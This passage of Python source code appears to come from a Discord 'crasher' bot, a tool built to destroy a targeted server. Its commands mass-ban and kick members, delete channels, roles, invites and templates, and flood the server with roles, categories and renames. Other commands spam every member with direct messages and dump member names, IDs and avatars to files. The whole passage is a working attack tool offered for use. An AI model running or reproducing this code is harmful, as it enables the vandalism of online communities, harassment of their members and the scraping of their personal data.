    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='refactor_server_icon')
async def refactor_server_icon(ctx, url: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if url is None:
            icon_path = os.path.join(os.path.dirname(__file__), 'icons', 'icon.png')
            if not os.path.exists(icon_path):
                Write.Print(lang_text["icon_not_found"], Colors.red_to_blue, interval=0)
                return
            
            with open(icon_path, 'rb') as icon_file:
                image_data = icon_file.read()
            
            await guild.edit(icon=image_data)
            Write.Print(lang_text["icon_updated"], Colors.green_to_yellow, interval=0)
        
        else:
            async with ctx.typing():
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url) as response:
                            if response.status == 200:
                                image_data = await response.read()
                                await guild.edit(icon=image_data)
                                Write.Print(lang_text["icon_updated"], Colors.green_to_yellow, interval=0)
                            else:
                                Write.Print(lang_text["icon_url_error"], Colors.red_to_blue, interval=0)
                except Exception as e:
                    Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='rename_all_roles')
async def rename_all_roles(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        for role in guild.roles:
            if role.id != guild.id:
                print(role.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await role.edit(name=new_name)
                    print(" - OK")
                except Exception as e:
                    print(f" - {lang_text['error'].format(error=e)}")
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='rename_all_users')
async def rename_all_users(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name = Write.Input(lang_text["rename_users_name_prompt"], Colors.red_to_blue, interval=0)
        
        for member in guild.members:
            if member.id not in base_exceptions:
                print(member.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await member.edit(nick=new_name)
                    print(" - OK")
                except Exception as e:
                    print(f" - {lang_text['error'].format(error=e)}")
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

async def change_activity(bot):
    activity_types = {
        1: nextcord.ActivityType.playing,
        2: nextcord.ActivityType.listening,
        3: nextcord.ActivityType.watching,
        4: nextcord.ActivityType.competing
    }
    activity_names = {
        1: "Playing" if language == "en" else "Играет",
        2: "Listening" if language == "en" else "Слушает",
        3: "Watching" if language == "en" else "Смотрит",
        4: "Competing" if language == "en" else "Соревнуется"
    }
    statuses = {
        1: nextcord.Status.online,
        2: nextcord.Status.idle,
        3: nextcord.Status.do_not_disturb,
    }
    status_names = {
        1: "Online" if language == "en" else "Онлайн",
        2: "Idle" if language == "en" else "Неактивен",
        3: "Do Not Disturb" if language == "en" else "Оффлайн"
    }
    Write.Print(lang_text["activity_prompt"], Colors.red_to_blue, interval=0)
    for key, value in activity_types.items():
        Write.Print(lang_text["activity_option"].format(key=key, activity_name=activity_names[key]), Colors.red_to_blue, interval=0)
    activity_type_choice = int(Write.Input(lang_text["activity_type_prompt"], Colors.red_to_blue, interval=0))
    Write.Print(lang_text["status_prompt"], Colors.red_to_blue, interval=0)
    for key, value in statuses.items():
        Write.Print(lang_text["status_option"].format(key=key, status_name=status_names[key]), Colors.red_to_blue, interval=0)
    status_choice = int(Write.Input(lang_text["status_type_prompt"], Colors.red_to_blue, interval=0))
    activity_name = Write.Input(lang_text["activity_name_prompt"], Colors.red_to_blue, interval=0)
    bot.current_activity = nextcord.Activity(
        type=activity_types[activity_type_choice], 
        name=activity_name
    )
    bot.current_status = statuses[status_choice]
    if bot.is_ready():
        await bot.change_presence(
            activity=bot.current_activity,
            status=bot.current_status
        )
    Write.Print(lang_text["activity_set"], Colors.red_to_blue, interval=0)
    Write.Print(lang_text["activity_details"].format(
        activity_name=activity_names[activity_type_choice], 
        status_name=status_names[status_choice], 
        activity_name_input=activity_name
    ), Colors.red_to_white, interval=0)

@bot.command(name='rename_all_channels')
async def rename_all_channels(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name_input = Write.Input(lang_text["rename_channels_name_prompt"], Colors.red_to_blue, interval=0)
            if name_input:
                name = name_input
        
        for channel in guild.channels:
            if isinstance(channel, nextcord.TextChannel) or isinstance(channel, nextcord.VoiceChannel) or isinstance(channel, nextcord.CategoryChannel):
                print(channel.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await channel.edit(name=new_name)
                    print(" - OK")
                except Exception as e:
                    print(f" - {lang_text['error'].format(error=e)}")
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='flood_category')
@commands.has_permissions(manage_channels=True)
async def flood_category(ctx, count: int = 0):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input(lang_text["flood_category_count"], Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        name = Write.Input(lang_text["flood_category_name"], Colors.red_to_blue, interval=0)
        
        for _ in range(count):
            category_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_category(name=category_name)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='flood_roles')
async def flood_roles(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input(lang_text["flood_roles_count"], Colors.green_to_yellow, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        if name is None:
            name = Write.Input(lang_text["flood_roles_name"], Colors.green_to_yellow, interval=0)
        
        for _ in range(count):
            role_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_role(name=role_name, hoist=True)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='flood_rename_server')
async def flood_rename_server(ctx, timer: int = 10):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if timer == 0:
            timer_input = Write.Input(lang_text["flood_server_timer"], Colors.red_to_blue, interval=0)
            if timer_input:
                timer = int(timer_input)
            else:
                timer = 2
        
        mode = Write.Input(lang_text["flood_server_mode"], Colors.red_to_blue, interval=0)
        
        if mode.lower() == '1':
            name = Write.Input(lang_text["flood_server_name"], Colors.red_to_blue, interval=0)
            if not name:
                Write.Print(lang_text["flood_server_name_missing"], Colors.red_to_blue, interval=0)
                return
            
            if len(name) >= 2:
                await guild.edit(name=name[:2])
                await asyncio.sleep(timer)
            
            for char in name[2:]:
                await guild.edit(name=guild.name + char)
                await asyncio.sleep(timer)
        
        elif mode.lower() == '2':
            names = []
            for i in range(1, 6):
                name = Write.Input(lang_text["flood_server_names"].format(index=i), Colors.red_to_blue, interval=0)
                if not name:
                    break
                names.append(name)
            
            if not names:
                Write.Print(lang_text["flood_server_names_missing"], Colors.red_to_blue, interval=0)
                return
            
            index = 0
            start_time = time.time()
            while True:
                await guild.edit(name=names[index])
                index = (index + 1) % len(names)
                await asyncio.sleep(timer)
        
        else:
            Write.Print(lang_text["flood_server_invalid_mode"], Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

async def add_exception(user_id: int):
    try:
        if not os.path.exists("configs/exceptions.json"):
            base_exceptions = [bot_id, user_id]
            with open("configs/exceptions.json", "w") as f:
                json.dump(base_exceptions, f, indent=4)
            exception_list = base_exceptions
        else:
            with open("configs/exceptions.json", "r") as f:
                exception_list = json.load(f)

        if user_id not in exception_list:
            exception_list.append(user_id)
            with open("configs/exceptions.json", "w") as f:
                json.dump(exception_list, f, indent=4)
            Write.Print(lang_text["exception_added"].format(user_id=user_id), Colors.green_to_yellow, interval=0)
        else:
            Write.Print(lang_text["exception_exists"], Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(lang_text["exception_error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='change_config')
async def change_config(ctx=None):
    while True:
        with open('configs/setup.json', 'r', encoding='utf-8') as f:
            setup = json.load(f)

        user_id = setup.get('USER_ID', 'not set')
        bot_id = setup.get('BOT_ID', 'not set')
        token = setup.get('TOKEN', 'not set')
        server_data = setup.get('SERVER', {})
        server_id = server_data.get('id', 'not set')
        server_name = server_data.get('name', 'unknown')

        bot_name = bot.user.name if bot.user else "unknown"

        Write.Print(lang_text["config_menu_title"], Colors.red_to_blue, interval=0)
        Write.Print(lang_text["config_user_id"].format(user_id=user_id), Colors.red_to_white, interval=0)
        Write.Print(lang_text["config_bot_id"].format(bot_id=bot_id), Colors.red_to_white, interval=0)
        Write.Print(lang_text["config_token"].format(token=token, bot_name=bot_name), Colors.red_to_white, interval=0)
        Write.Print(lang_text["config_server"].format(server_id=server_id, server_name=server_name), Colors.red_to_white, interval=0)
        Write.Print(lang_text["config_exit"], Colors.red_to_white, interval=0)

        choice = Write.Input(lang_text["config_choice_prompt"], Colors.red_to_blue, interval=0)

        if choice == '1':
            setup['USER_ID'] = Write.Input(lang_text["config_new_user_id"], Colors.red_to_white, interval=0)
        elif choice == '2':
            setup['BOT_ID'] = Write.Input(lang_text["config_new_bot_id"], Colors.red_to_white, interval=0)
        elif choice == '3':
            setup['TOKEN'] = Write.Input(lang_text["config_new_token"], Colors.red_to_white, interval=0)
        elif choice == '4':
            new_id = Write.Input(lang_text["config_new_server_id"], Colors.red_to_white, interval=0)
            name = await soft.get_server_name(int(new_id))
            setup['SERVER'] = {'id': int(new_id), 'name': name}
            setup['SERVER_ID'] = int(new_id)
        elif choice == '5':
            break
        else:
            Write.Print(lang_text["config_invalid_choice"], Colors.red_to_blue, interval=0)
            continue

        with open('configs/setup.json', 'w', encoding='utf-8') as f:
            json.dump(setup, f, indent=4)

        Write.Print(lang_text["config_updated"], Colors.green_to_yellow, interval=0)

@bot.command(name='dump_users')
async def dump_users(ctx):
    try:
        with open("configs/setup.json", 'r', encoding='utf-8') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return

        await guild.chunk()

        users = {}
        avatars = {}
        i = 0

        for member in guild.members:
            users[i] = {
                'NAME': member.name,
                'ID': member.id,
                'BORN': str(member.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            }
            avatars[member.id] = {
                'AVATAR': str(member.avatar.url) if member.avatar else None
            }
            i += 1

        timestamp = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
        dump_folder = os.path.join("dump", str(target_server_id), timestamp)
        os.makedirs(dump_folder, exist_ok=True)

        with open(os.path.join(dump_folder, "users.json"), 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=4, ensure_ascii=False)

        with open(os.path.join(dump_folder, "avatars.json"), 'w', encoding='utf-8') as f:
            json.dump(avatars, f, indent=4, ensure_ascii=False)

        Write.Print(lang_text["dump_users_saved"].format(count=i, folder=dump_folder), Colors.green_to_yellow, interval=0)

    except Exception as e:
        Write.Print(lang_text["dump_users_error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_all')
async def delete_all(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        await delete_channels(ctx)
        await delete_roles(ctx)
        await delete_templates(ctx)
        await delete_invite(ctx)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='kick_users')
async def kick_users(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        for member in guild.members:
            if member.id not in base_exceptions:
                await member.kick(reason="Server destroyed with CrashDiscord: URL")
                Write.Print(lang_text["kick_user"].format(user_name=member.name, user_id=member.id), Colors.green_to_yellow, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='ban_users')
async def ban_users(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        for member in guild.members:
            if member.id not in base_exceptions:
                await member.ban(reason="Server destroyed with CrashDiscord: URL")
                Write.Print(lang_text["ban_user"].format(user_name=member.name, user_id=member.id), Colors.green_to_yellow, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='flood_pm')
async def flood_pm(ctx, *, text: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return

        if not text:
            text_input = Write.Input(lang_text["flood_pm_text"], Colors.red_to_blue, interval=0)
            text = text_input if text_input else crash_discord_ad_pm

        for member in guild.members:
            try:
                await member.send(text)
            except Exception as e:
                Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

async def check_update(bot=None):
    if os.path.exists("version.txt"):
        with open("version.txt", "r") as f:
            local_version = f.read().strip()
    else:
        local_version = "0.0"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://raw.githubusercontent.com/kittenello/Discord-Crasher/refs/heads/main/version.txt") as resp:
                if resp.status == 200:
                    remote_version = (await resp.text()).strip()
                else:
                    Write.Print(lang_text["version_check_fail"], Colors.red_to_blue, interval=0)
                    return
    except Exception as e:
        Write.Print(lang_text["error_connecting"].format(error=e), Colors.red_to_blue, interval=0)
        return

    if local_version == remote_version:
        Write.Print(lang_text["version_up_to_date"].format(version=local_version), Colors.green_to_yellow, interval=0)
    else:
        Write.Print(lang_text["version_outdated"].format(local_version=local_version, remote_version=remote_version), Colors.red_to_blue, interval=0)
        answer = Write.Input(lang_text["update_prompt"], Colors.red_to_blue, interval=0)
        if answer.lower() == 'y':
            webbrowser.open("https://github.com/kittenello/Discord-Crasher/releases")
        else:
            confirm = Write.Input(lang_text["confirm_decline"], Colors.red_to_white, interval=0)
            if confirm.lower() == 'n':
                Write.Print(lang_text["declined_update"], Colors.red_to_white, interval=0)
            else:
                webbrowser.open("https://github.com/kittenello/Discord-Crasher/releases")

@bot.command(name='flood_mass_pm')
async def flood_mass_pm(ctx, count: int = 0, *, text: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input(lang_text["flood_mass_pm_count"], Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(5, 15)

        if not text:
            text_input = Write.Input(lang_text["flood_mass_pm_text"], Colors.red_to_blue, interval=0)
            text = text_input if text_input else crash_discord_ad_pm

        for _ in range(count):
            for member in guild.members:
                try:
                    await member.send(text)
                except Exception as e:
                    Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='give_random_roles')
async def give_random_roles(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input(lang_text["random_roles_count"], Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        if name is None:
            name_input = Write.Input(lang_text["random_roles_name"], Colors.red_to_blue, interval=0)
            if name_input:
                name = name_input
        
        for _ in range(count):
            role_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            role = await guild.create_role(name=role_name, hoist=True)
            user = random.choice([member for member in guild.members if member.id not in base_exceptions])
            if user:
                await user.add_roles(role)
                Write.Print(lang_text["random_roles_assigned"].format(role_name=role_name, user_name=user.name), Colors.green_to_yellow, interval=0)
            else:
                Write.Print(lang_text["random_roles_no_users"], Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

@bot.command(name='delete_roles')
async def delete_roles(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(lang_text["server_id_not_found"], Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(lang_text["server_not_found"].format(server_id=target_server_id), Colors.red_to_blue, interval=0)
            return
        
        for role in guild.roles:
            if role.id != guild.id:
                print(role.name, end="")
                try:
                    await role.delete()
                    print(" - OK")
                except Exception as e:
                    print(f" - {lang_text['error'].format(error=e)}")
    
    except Exception as e:
        Write.Print(lang_text["error"].format(error=e), Colors.red_to_blue, interval=0)

async def get_server_name(self, server_id: int):
    headers = {
        "Authorization": f"Bot {self.token}",
        "Content-Type": "application/json"
    }
    try:
        response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}", headers=headers)
        if response.status_code == 200:
            return response.json().get("name", "Unknown")
        else:
            return "Unknown"
    except Exception as e:
        print(f"{e}")
        return "Unknown"

class Soft:
    def __init__(self, user_id: int, bot_id: int, token: str, bot):
        self.user_id = user_id
        self.bot_id = bot_id
        self.token = token
        self.bot = bot
        self.server_id = None
        self.server_name = None

    async def run(self):
        await bot.is_ready_event.wait()
        os.system('cls')
        Write.Print(id_text, Colors.red_to_blue, interval=0)

        if os.path.exists('configs/setup.json'):
            with open('configs/setup.json', 'r') as f:
                setup = json.load(f)
            self.server_id = setup.get('SERVER', {}).get('id')
            self.server_name = setup.get('SERVER', {}).get('name')

        if self.server_id:
            response = Write.Input(lang_text["soft_confirm_server"].format(server_name=self.server_name, server_id=self.server_id), Colors.red_to_blue, interval=0)
            if response.lower() == 'y':
                pass
            else:
                Write.Print(lang_text["soft_new_server_id"], Colors.red_to_blue, interval=0)
                self.server_id = int(Write.Input(">> ", Colors.red_to_blue, interval=0))
                self.server_name = await self.get_server_name(self.server_id)
                with open('configs/setup.json', 'r') as f:
                    setup = json.load(f)
                setup['SERVER'] = {'id': self.server_id, 'name': self.server_name}
                with open('configs/setup.json', 'w') as f:
                    json.dump(setup, f, indent=4)
        else:
            Write.Print(lang_text["soft_new_server_id"], Colors.red_to_blue, interval=0)
            self.server_id = int(Write.Input(">> ", Colors.red_to_blue, interval=0))
            self.server_name = await self.get_server_name(self.server_id)
            with open('configs/setup.json', 'r') as f:
                setup = json.load(f)
            setup['SERVER'] = {'id': self.server_id, 'name': self.server_name}
            with open('configs/setup.json', 'w') as f:
                json.dump(setup, f, indent=4)

        global exception_ids
        base_exceptions = [
            self.bot_id,
            self.user_id
        ]
        choice = Write.Input(lang_text["soft_exceptions_choice"], Colors.red_to_blue, interval=0)
        if choice.lower() == 'y':
            if os.path.exists("configs/exceptions.json"):
                with open("configs/exceptions.json", "r") as f:
                    exception_ids = json.load(f)
            else:
                Write.Print(lang_text["soft_exceptions_not_found"], Colors.red_to_blue, interval=0)
                exception_ids = base_exceptions
        else:
            exception_ids = base_exceptions

        os.system("cls")
        Write.Print(logo, Colors.red_to_blue, interval=0)
        Write.Print(Center.XCenter(Box.DoubleCube(menu if language == "ru" else menueng)), Colors.red_to_blue, interval=0)

        while True:
            command = int(Write.Input(lang_text["soft_command_prompt"], Colors.red_to_blue, interval=0))
            if command == 1:
                await delete_channels(self.bot)
            elif command == 2:
                await ban_users(self.bot)
            elif command == 3:
                await kick_users(self.bot)
            elif command == 4:
                await full_admin(self.bot)
            elif command == 5:
                await delete_roles(self.bot)
            elif command == 6:
                await delete_all(self.bot)
            elif command == 7:
                await spam_channels(self.bot)
            elif command == 8:
                await spam_channel(self.bot)
            elif command == 9:
                await flood_category(self.bot)
            elif command == 10:
                await flood_channels(self.bot)
            elif command == 11:
                await flood_roles(self.bot)
            elif command == 12:
                await flood_rename_server(self.bot)
            elif command == 13:
                await flood_pm(self.bot)
            elif command == 14:
                await flood_mass_pm(self.bot)
            elif command == 15:
                await rename_all_users(self.bot)
            elif command == 16:
                await rename_all_channels(self.bot)
            elif command == 17:
                await rename_all_roles(self.bot)
            elif command == 18:
                await rename_server(self.bot)
            elif command == 19:
                await refactor_server_icon(self.bot)
            elif command == 20:
                await give_random_roles(self.bot)
            elif command == 21:
                await delete_templates(self.bot)
            elif command == 22:
                await delete_invite(self.bot)
            elif command == 23:
                await delete_emoji(self.bot)
            elif command == 24:
                await delete_stickers(self.bot)
            elif command == 25:
                await delete_automod(self.bot)
            elif command == 26:
                user_id_input = int(Write.Input(lang_text["exception_prompt"], Colors.red_to_blue, interval=0))
                await add_exception(user_id_input)
            elif command == 27:
                await change_activity(self.bot)
            elif command == 28:
                await dump_users(self.bot)
            elif command == 29:
                await change_config(self.bot)
            elif command == 30:
                await check_update(self.bot)
            elif command == 666:
                exit(0)
            elif command == 777:
                Write.Print(lang_text["soft_info"], Colors.red_to_blue, interval=0)
                Write.Input(lang_text["soft_info_ok"], Colors.red_to_blue, interval=0)
            else:
                Write.Print(lang_text["soft_invalid_command"], Colors.red_to_blue, interval=0)
            Write.Input(lang_text["soft_continue_prompt"], Colors.red_to_blue, interval=0)
            os.system("cls")
            Write.Print(logo, Colors.red_to_blue, interval=0)
            Write.Print(Center.XCenter(Box.DoubleCube(menu if language == "ru" else menueng)), Colors.red_to_blue, interval=0)

soft = Soft(user_id, bot_id, TOKEN, bot)

async def main():
    bot_task = asyncio.create_task(bot.start(TOKEN))
    await bot.is_ready_event.wait()
    
    await soft.run()
    await bot_task

if __name__ == "__main__":
    bot.run(TOKEN)